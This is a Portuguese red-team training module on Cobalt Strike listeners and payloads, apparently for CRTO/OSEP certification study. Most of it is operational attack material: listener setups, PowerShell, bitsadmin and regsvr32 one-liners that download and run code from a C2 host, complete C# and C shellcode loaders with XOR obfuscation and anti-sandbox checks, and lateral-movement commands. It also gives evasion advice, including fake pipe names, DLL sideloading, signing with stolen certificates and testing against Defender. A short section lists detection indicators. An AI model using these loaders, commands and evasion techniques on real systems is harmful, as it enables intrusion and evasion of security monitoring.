---
layout: cyber
section: c2
title: "Listeners e Payloads no Cobalt Strike"
---

# Listeners e Payloads no Cobalt Strike

## Os Dois Lados de Toda Conexão C2

Listener e payload são os dois lados da conexão C2: listener escuta no servidor, payload executa no alvo e conecta de volta. A escolha do tipo de listener e formato de payload é uma das decisões mais críticas em engagement — configuração errada queima infraestrutura em segundos (listener HTTP sem customização cai em EDR moderno na primeira conexão), falha na entrega quando o formato é incompatível com o ambiente, expõe o C2 durante staging (se for staged), e limita movimento lateral (SMB vs HTTP em redes segmentadas é decisão que define o engagement).

Pra CRTO I/II é exigência prática: configurar listeners de múltiplos tipos, gerar payloads em formatos variados, decidir quando usar cada. Pra OSEP o entendimento profundo de shellcode loaders e técnicas de injeção começa aqui.

---

## A Mecânica do Listener

### O Papel do Listener

Um listener é um "ponto de escuta" configurado no Team Server que define:
1. **Qual protocolo** será usado para comunicação com o Beacon
2. **Onde** o Beacon vai se conectar (host/IP/domínio + porta)
3. **Como** o tráfego será encapsulado (via Malleable C2 Profile)

O listener existe independente de qualquer payload gerado. Um mesmo listener pode ter dezenas de Beacons ativos conectando a ele.

### Fluxo Completo: Listener → Payload → Beacon

```
[Team Server com Listener HTTP na porta 80]
         ^
         |  (Beacon faz check-in HTTP GET)
         |
[Payload .exe executado no alvo]
   |
   v
[Beacon desempacota]
   |
   v
[Beacon resolve DNS/IP do listener]
   |
   v
[Beacon conecta via HTTP e faz check-in]
```

### Tipos de Listener em Detalhe

#### HTTP Listener

```
Protocolo: HTTP (cleartext)
Porta padrão: 80
Comunicação: Beacon faz GET periódico, POST com resultados
Encryption: RC4 por padrão, keys negociadas durante staging
```

**Características:**
- Mais simples de configurar
- Tráfego visível em proxies corporativos (HTTP inspection)
- Customizável via Malleable C2 para imitar tráfego legítimo
- Funciona em ambientes onde HTTPS não é inspecionado (raro)

**Configuração:**
```
Name: http-principal
Payload: windows/beacon_http/reverse_http
Host (Stager): 10.10.10.1          # IP do redirector ou C2
Port (Stager): 80
Host (HTTP Beacon): 10.10.10.1
Port (HTTP Beacon): 80
Beacon Intervals: [padrão do profile]
```

#### HTTPS Listener

```
Protocolo: HTTPS (TLS)
Porta padrão: 443
Comunicação: Mesmo que HTTP mas sobre TLS
Encryption: TLS + RC4 interno
```

**Características:**
- Padrão para a maioria dos engajamentos
- Requer certificado SSL (pode ser auto-assinado ou via keystore)
- Proxy corporativos com SSL inspection podem interceptar
- Fingerprint do certificado pode ser IoC se não customizado

**Geração de certificado para Cobalt Strike:**
```bash
# Gerar keystore Java com certificado Let's Encrypt via keytool

# Opção 1: Certificado auto-assinado (detecção mais fácil)
keytool -genkey -alias cobaltstrike -keyalg RSA -keystore cobaltstrike.store -storepass changeit -keypass changeit

# Opção 2: Importar certificado real (mais stealth)
# Gerar certificado com certbot primeiro:
certbot certonly --standalone -d seudominio.com

# Converter PEM para PKCS12
openssl pkcs12 -export \
  -in /etc/letsencrypt/live/seudominio.com/fullchain.pem \
  -inkey /etc/letsencrypt/live/seudominio.com/privkey.pem \
  -out seudominio.p12 \
  -name cobaltstrike \
  -passout pass:senha123

# Importar PKCS12 para Java keystore
keytool -importkeystore \
  -deststorepass senha123 \
  -destkeypass senha123 \
  -destkeystore cobaltstrike.store \
  -srckeystore seudominio.p12 \
  -srcstoretype PKCS12 \
  -srcstorepass senha123 \
  -alias cobaltstrike

# Configurar no listener:
# Keystore: /opt/cobaltstrike/cobaltstrike.store
# Password: senha123
```

#### DNS Listener

```
Protocolo: DNS (A, AAAA, TXT records)
Porta: 53 UDP/TCP
Comunicação: Muito lenta (~1-2KB/s para TXT, <1KB/s para A records)
Encryption: RC4
```

**Características:**
- Passa por praticamente todos os firewalls corporativos
- Muito lento - não usar para operações ativas, apenas como canal de backup
- Requer controle de servidor DNS autoritativo para o domínio
- Ideal como "seguro morto" quando HTTP/HTTPS está bloqueado

**Setup de DNS autoritativo:**
```bash
# 1. Registrar domínio (ex: meudominio.com)
# 2. Criar registro NS apontando subdomínio para o C2
#    ns1.meudominio.com -> IP_do_C2
#    c2.meudominio.com NS ns1.meudominio.com

# 3. No Team Server, listener DNS:
# Name: dns-backup
# Payload: windows/beacon_dns/reverse_dns_txt
# Beacon Domain: c2.meudominio.com
# DNS Idle: 0.0.0.0 (resposta quando sem tarefas)
# DNS Stager Subhost: stage.meudominio.com

# 4. Verificar resolução DNS no alvo
nslookup c2.meudominio.com
```

**Comandos DNS no Beacon para alterar modo:**
```bash
# Mudar para modo DNS (quando HTTP comprometido)
mode dns
mode dns-txt   # mais rápido que A records
mode dns6      # via AAAA records

# Reverter para HTTP
mode http
```

#### SMB Listener (Named Pipe)

```
Protocolo: Named Pipe (SMB \\\\.\\pipe\\)
Porta: N/A (sem porta de rede própria)
Comunicação: P2P entre Beacons via pipe nomeado
```

**Características:**
- ZERO tráfego direto para o C2 externo
- O Beacon SMB comunica via Named Pipe com outro Beacon que tem saída HTTP/HTTPS
- Essencial para redes segmentadas onde hosts internos não têm acesso à internet
- Detectável via eventos de Named Pipe no Windows (Sysmon Event ID 17/18)

```
[C2 Externo]
     ^
     | HTTP
     |
[Beacon HTTP no host com acesso à internet]
     ^
     | Named Pipe (SMB)
     |
[Beacon SMB em host segmentado sem acesso externo]
     ^
     | Named Pipe (SMB)
     |
[Beacon SMB em outro host interno]
```

**Configuração do SMB Listener:**
```
Name: smb-lateral
Payload: windows/beacon_bind_pipe
Pipename: [customizar - não usar padrão "msagent_XX"]
```

**Linkando Beacons SMB:**
```bash
# No Beacon que tem saída HTTP/HTTPS:
link SERVER02              # Conecta ao Beacon SMB no SERVER02
link SERVER02 pipe_name    # Com nome de pipe específico

# Desconectar
unlink SERVER02
```

#### TCP Listener (Bind e Reverse)

```
Protocolo: TCP raw
Porta: customizável
Comunicação: TCP direto entre Beacons (bind ou reverse)
```

**TCP Bind**: O Beacon fica ouvindo em uma porta, aguarda conexão do Beacon pai.
**TCP Reverse**: O Beacon conecta de volta ao Beacon pai.

**Configuração:**
```
# TCP Bind Listener:
Name: tcp-bind
Payload: windows/beacon_bind_tcp
Port (Bind): 4444
Bind To: 127.0.0.1  # ou 0.0.0.0

# TCP Reverse Listener:
Name: tcp-reverse
Payload: windows/beacon_reverse_tcp
Host: [IP do Beacon pai]
Port: 4444
```

**Conectando via TCP:**
```bash
# No Beacon pai, conectar a Beacon TCP bind:
connect SERVER03 4444

# Desconectar
unlink SERVER03 4444
```

---

## Na Prática

### Staged vs Stageless: Decisão Crítica

```
STAGED PAYLOAD:
┌─────────────────────────────────────────────────────────┐
│  Stager (pequeno: ~100 bytes shellcode)                 │
│  ↓                                                      │
│  Executa no alvo                                        │
│  ↓                                                      │
│  Faz GET http://C2/uri_staging                          │
│  ↓                                                      │
│  Recebe Beacon completo (~250KB)                        │
│  ↓                                                      │
│  Injeta e executa Beacon em memória                     │
└─────────────────────────────────────────────────────────┘

Prós:
- Payload entregue é mínimo (fácil de ofuscar)
- Útil quando há limitação de tamanho (ex: buffer overflow)

Contras:
- EXPÕE O SERVIDOR C2 durante staging (stager faz request sem autenticação)
- Tráfego de staging é detectável (tamanho fixo da resposta ~250KB)
- Requer que o alvo tenha acesso ao C2 no momento da execução
- Staging via HTTP é em plaintext por padrão

STAGELESS PAYLOAD:
┌─────────────────────────────────────────────────────────┐
│  Payload completo (Beacon embutido: ~250KB+)            │
│  ↓                                                      │
│  Executa no alvo                                        │
│  ↓                                                      │
│  Descomprime/decripta Beacon                            │
│  ↓                                                      │
│  Faz check-in direto com C2                             │
└─────────────────────────────────────────────────────────┘

Prós:
- Sem exposição do C2 durante staging
- Mais resistente a análise de tráfego
- O payload em si pode ser customizado/ofuscado

Contras:
- Arquivo maior (dificulta entrega em alguns cenários)
- Mais difícil de esconder em phishing (arquivo grande)
```

**Regra geral para CRTO/OSEP:**
- Ambientes corporativos → Stageless HTTPS
- Exploits com limitação de tamanho → Staged
- DNS Beacon → Sempre staged (DNS não consegue transferir payload completo de uma vez)

### Artifact Kit

O Artifact Kit é um conjunto de templates em C para gerar executáveis e DLLs que carregam o Beacon de maneiras que evitam assinaturas de AV/EDR.

**Por que usar:**
- Os artefatos padrão do Cobalt Strike (exe, dll) têm assinaturas conhecidas por todos os AV
- O Artifact Kit permite customizar o "loader" que empacota o Beacon
- Muda como o Beacon é armazenado e carregado em memória

**Estrutura do Artifact Kit:**
```
artifact-kit/
├── src/
│   ├── main.c          # Template do loader principal
│   ├── bypass-pipe.c   # Bypass via pipe trick
│   ├── bypass-readfile.c  # Bypass via ReadFile
│   └── bypass-jmp.c    # Bypass via jmp instruction
├── dist/
│   └── artifact.cna    # Script Aggressor para integrar
└── build.sh            # Script de compilação
```

**Compilar e carregar o Artifact Kit:**
```bash
# No servidor de build (precisa de mingw-w64)
apt-get install -y mingw-w64

cd /opt/cobaltstrike/arsenal-kit/kits/artifact/
./build.sh

# Carregar no CS Client:
# Script Console > load /opt/cobaltstrike/arsenal-kit/kits/artifact/dist/artifact.cna

# Agora todos os payloads gerados usarão os templates customizados
```

**Customizar bypass no Artifact Kit:**
```c
// Em src/bypass-pipe.c - exemplo de customização
// Trocar o método de alocação de memória

// Original (detectável):
// VirtualAlloc + memcpy

// Customizado:
// Usar NtAllocateVirtualMemory + RtlCopyMemory
// Isso quebra muitas assinaturas de AV
```

### Sleep Mask Kit

O Sleep Mask Kit encripta o Beacon em memória enquanto ele está dormindo (no intervalo entre check-ins). Isso evita varreduras de memória in-runtime.

```bash
# Compilar Sleep Mask
cd /opt/cobaltstrike/arsenal-kit/kits/sleepmask/
./build.sh

# Carregar no CS Client via Aggressor Script
# O perfil Malleable C2 deve ter:
# set sleep_mask "true";
```

**Por que isso importa:**
- EDRs modernos fazem scan de memória procurando padrões do Beacon em processos
- Sem Sleep Mask: strings do Beacon ficam em plaintext durante o sleep
- Com Sleep Mask: o Beacon encripta a si mesmo antes de dormir, decripta ao acordar

---

## Exemplos de Código / Comandos

### Gerando Payloads no CS Client

```
# MENU: Attacks > Packages

# 1. Windows Executable (Stageless)
Payload: windows/beacon_https/reverse_https
Output: Windows EXE
[x] Use x64 payload
→ Gera: payload.exe (stageless)

# 2. Windows Executable (Staged) 
Payload: windows/beacon_https/reverse_https  
Output: Windows Stager
→ Gera: payload.exe (stager pequeno)

# 3. Windows DLL (Stageless)
Payload: windows/beacon_https/reverse_https
Output: Windows DLL
→ Gera: payload.dll

# 4. HTML Application
Payload: windows/beacon_https/reverse_https
Output: HTML Application (VBScript ou PowerShell)
→ Gera: payload.hta

# 5. PowerShell
Payload: windows/beacon_https/reverse_https  
Output: PowerShell Command
→ Gera: comando ps1 oneliner ou arquivo .ps1

# 6. Raw Shellcode (para usar em loaders customizados)
Payload: windows/beacon_https/reverse_https
Output: Raw
→ Gera: payload.bin (shellcode bruto)

# 7. C# Source (para templates)
# Attacks > Scripted Web Delivery > PowerShell
# Também: Payload Generator para formato C#
```

### Gerando Shellcode via Scripted Web Delivery

```bash
# No CS Client:
# Attacks > Scripted Web Delivery (S)
# URL: http://C2_IP/payload
# Listener: http-principal
# Type: PowerShell (one-liner)

# Resultado: URL e comando para executar no alvo:
powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://C2_IP/a'))"

# Type: bitsadmin (LOLBIN)
# Resultado:
bitsadmin /transfer cocacola /download /priority foreground http://C2_IP/b c:\windows\temp\1.exe&c:\windows\temp\1.exe

# Type: regsvr32
# Resultado:
regsvr32 /s /n /u /i:http://C2_IP/T56n.sct scrobj.dll
```

### Geração de Payload C# para Template

```csharp
// Ao usar "Payload Generator" > C# no CS Client
// Recebe-se algo como:

// Copiar e usar como base para loader customizado:

byte[] buf = new byte[891] {
    0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, 0xcc, 0x00, 0x00, 0x00, 
    // ... centenas de bytes de shellcode ...
    0x00, 0x00
};

// Template de loader C# básico para execute-assembly
using System;
using System.Runtime.InteropServices;

namespace ShellcodeLoader {
    class Program {
        [DllImport("kernel32.dll")]
        static extern IntPtr VirtualAlloc(
            IntPtr lpAddress, uint dwSize, 
            uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateThread(
            IntPtr lpThreadAttributes, uint dwStackSize,
            IntPtr lpStartAddress, IntPtr lpParameter,
            uint dwCreationFlags, IntPtr lpThreadId);

        [DllImport("kernel32.dll")]
        static extern UInt32 WaitForSingleObject(
            IntPtr hHandle, UInt32 dwMilliseconds);

        static void Main(string[] args) {
            // Shellcode do Cobalt Strike (gerado via Payload Generator)
            byte[] shellcode = new byte[] {
                /* INSERIR SHELLCODE AQUI */
            };

            // Alocar memória executável
            IntPtr memory = VirtualAlloc(
                IntPtr.Zero,
                (uint)shellcode.Length,
                0x3000,   // MEM_COMMIT | MEM_RESERVE
                0x40      // PAGE_EXECUTE_READWRITE
            );

            // Copiar shellcode
            Marshal.Copy(shellcode, 0, memory, shellcode.Length);

            // Criar thread e executar
            IntPtr thread = CreateThread(
                IntPtr.Zero, 0, memory, 
                IntPtr.Zero, 0, IntPtr.Zero);

            WaitForSingleObject(thread, 0xFFFFFFFF);
        }
    }
}
```

### SMB Beacon para Movimento Lateral

```bash
# CENÁRIO: Você tem Beacon HTTP no HOST-A (acesso à internet)
#          Quer comprometer HOST-B (sem acesso direto ao C2)

# 1. Criar listener SMB no CS:
# Name: smb-lateral
# Payload: windows/beacon_bind_pipe
# Pipename: mypipe-f3f3f3  # customizar para evitar detecção

# 2. A partir do Beacon no HOST-A, fazer movimento lateral:
jump psexec_psh HOST-B smb-lateral
# Ou via WMI:
jump wmi HOST-B smb-lateral

# 3. Aguardar Beacon SMB aparecer no CS Client
# O Beacon SMB vai estar conectado via o Beacon HTTP do HOST-A

# 4. Para verificar hierarquia:
# HOST-A [HTTP] → HOST-B [SMB] → HOST-C [SMB]

# Linkar manualmente se necessário:
# No Beacon do HOST-A:
link HOST-B mypipe-f3f3f3

# 5. Deslinkar quando terminar
unlink HOST-B
```

### TCP Beacon para Pivoting

```bash
# CENÁRIO: HOST-A tem Beacon HTTP
#          HOST-B está atrás de firewall, apenas HOST-A pode se conectar a ele
#          HOST-B não pode conectar para o exterior

# 1. Criar listener TCP Bind:
# Name: tcp-pivot
# Payload: windows/beacon_bind_tcp
# Port: 9999
# Bind To: 127.0.0.1 (apenas local) ou 0.0.0.0

# 2. Mover payload TCP para HOST-B:
# No Beacon do HOST-A:
upload /opt/payloads/tcp-payload.exe
shell move tcp-payload.exe \\HOST-B\C$\Windows\Temp\
shell \\HOST-B\C$\Windows\Temp\tcp-payload.exe  # via PsExec ou similar

# 3. Conectar do HOST-A para HOST-B:
connect HOST-B 9999

# 4. Beacon TCP aparece no CS Client conectado via HOST-A
```

### Prepended Shellcode Loaders

Uma técnica para carregar shellcode do Beacon com código de evasão extra:

```c
// loader_template.c - compila com mingw
#include <windows.h>
#include <stdio.h>

// Função de decriptação XOR simples para ofuscar shellcode
void xor_decrypt(unsigned char *data, size_t len, unsigned char key) {
    for (size_t i = 0; i < len; i++) {
        data[i] ^= key;
    }
}

// Verificação de ambiente (anti-sandbox)
int is_sandbox() {
    // Verificar número de processos (sandboxes têm poucos)
    // Verificar tempo de uptime
    // Verificar presença de arquivos de usuário
    SYSTEM_INFO si;
    GetSystemInfo(&si);
    if (si.dwNumberOfProcessors < 2) return 1;
    return 0;
}

int main() {
    if (is_sandbox()) {
        // Parecer legítimo em sandbox
        MessageBox(NULL, "Erro ao processar arquivo", "Erro", MB_OK);
        return 0;
    }

    // Shellcode do Beacon (XOR encriptado com chave 0x41)
    unsigned char shellcode[] = {
        /* SHELLCODE XOR-ENCRIPTADO AQUI */
    };
    size_t shellcode_len = sizeof(shellcode);
    
    // Decriptar shellcode em memória
    xor_decrypt(shellcode, shellcode_len, 0x41);
    
    // Alocar memória com permissões R/W primeiro (sem X!)
    void *mem = VirtualAlloc(NULL, shellcode_len, 
                              MEM_COMMIT | MEM_RESERVE, 
                              PAGE_READWRITE);  // Não executável ainda
    
    // Copiar shellcode
    memcpy(mem, shellcode, shellcode_len);
    
    // Mudar para executável apenas depois de copiar
    DWORD old;
    VirtualProtect(mem, shellcode_len, PAGE_EXECUTE_READ, &old);
    
    // Criar thread via CreateThread ou via APC injection
    HANDLE hThread = CreateThread(NULL, 0, 
                                   (LPTHREAD_START_ROUTINE)mem,
                                   NULL, 0, NULL);
    WaitForSingleObject(hThread, INFINITE);
    return 0;
}
```

---

## Detecção e OPSEC

### Detecção de Listeners

```
DETECÇÕES COMUNS:

1. HTTP/HTTPS Listener:
   - Análise de certificado SSL (campos padrão do CS)
   - User-Agent inconsistente com aplicativo declarado
   - Beaconing regular (intervalos fixos sem jitter)
   - Tamanho de response do staging (~208KB)
   - URI paths característicos (/submit.php, /pixel.gif)
   
2. DNS Listener:
   - Queries DNS frequentes para subdomínio específico
   - Respostas TXT com base64 incomum
   - Volume anormal de queries DNS de uma estação
   - NXDomain responses padrão do CS
   
3. SMB Beacon (Named Pipe):
   - Sysmon Event ID 17: Pipe Created
   - Sysmon Event ID 18: Pipe Connected
   - Nomes de pipe suspeitos (\\\\.\\pipe\\postex_*)
   - Event ID 5145: Network share object accessed (SMB)

4. TCP Beacon:
   - Conexões TCP internas em portas incomuns
   - Conexões sem TLS em ambientes corporativos
```

### Customizações de OPSEC para Payloads

```bash
# 1. Usar Artifact Kit customizado (nunca usar artefatos padrão)
# Compilar com variação de chave e offset

# 2. Nomear pipe de SMB Beacon como algo legítimo
# Evitar: msagent_, postex_, mojo.
# Preferir: MsFteWds, lsarpc, wkssvc (nomes de pipes legítimos do Windows)

# 3. Para payloads EXE stageless:
# - Usar Artifact Kit com template customizado
# - Assinar digitalmente se possível (certificate theft ou compra)
# - Adicionar metadata de versão (FileDescription, CompanyName)
# via resource hacker ou similar

# 4. Para payloads DLL:
# - DLL export name deve ser realista
# - Usar DLL sideloading com aplicativo legítimo
# Exemplo: colocar payload.dll como "version.dll" ao lado de Teams.exe

# 5. Para shellcode raw:
# - Sempre encriptar (XOR, RC4 simples)
# - Descriptografar em memória apenas na execução
# - Não usar VirtualAlloc(RWX) - usar RW depois VirtualProtect para X

# 6. Evitar staging via HTTP para evitar exposição do C2
# Prefira stageless em HTTP/HTTPS

# 7. Testar payload antes de usar em campo
# Usar ThreatCheck:
.\ThreatCheck.exe -f payload.exe -e Defender
# Se detectado, identificar offset e ajustar

# 8. Para HTA:
# Ofuscar VBScript ou usar PowerShell oneliners codificados
# HTA ainda funciona em ambientes sem AppLocker

# 9. Customizar nome do pipe SMB via Malleable C2:
# set pipename "mojo.%x.%x";
# (usar pipes legítimos do Chrome, Teams, etc.)
```

### ThreatCheck para Validar Payloads

```bash
# ThreatCheck identifica quais bytes estão sendo detectados
# https://github.com/rasta-mouse/ThreatCheck

# Testar contra Windows Defender
.\ThreatCheck.exe -f beacon.exe -e Defender

# Testar contra AMSI
.\ThreatCheck.exe -f script.ps1 -e AMSI

# Saída esperada quando detectado:
# [!] Identified end of bad bytes at offset 0x1234
# 00 01 02 03 04 ... (bytes problemáticos)

# Com essa informação, pode-se:
# 1. Modificar o template do Artifact Kit naquela região
# 2. Encriptar/ofuscar aqueles bytes específicos
# 3. Usar técnica de stomping para sobrescrever
```

---

## Módulos Relacionados

`01_cobalt_strike_fundamentos.md` cobre arquitetura geral, tipos de Beacon e comunicação. `03_malleable_c2_profiles.md` aprofunda customização de listeners HTTP/HTTPS (headers, URIs). `04_infraestrutura_resiliente_redirectors.md` lida com onde apontar os listeners (redirectors vs C2 direto). MITRE ATT&CK: T1071.001 (HTTP/HTTPS), T1071.004 (DNS), T1090 (Proxy), T1105 (Ingress Tool Transfer), T1027 (Obfuscated Files), T1055 (Process Injection).

---

## Leitura Complementar

- Cobalt Strike Manual — HelpSystems
- The C2 Matrix — comparativo de frameworks C2
- Rasta Mouse blog — rastamouse.me
- Arsenal Kit: Artifact Kit, Sleep Mask Kit, UDRL Kit
- Ferramentas: ThreatCheck, PEStudio, pe-sieve
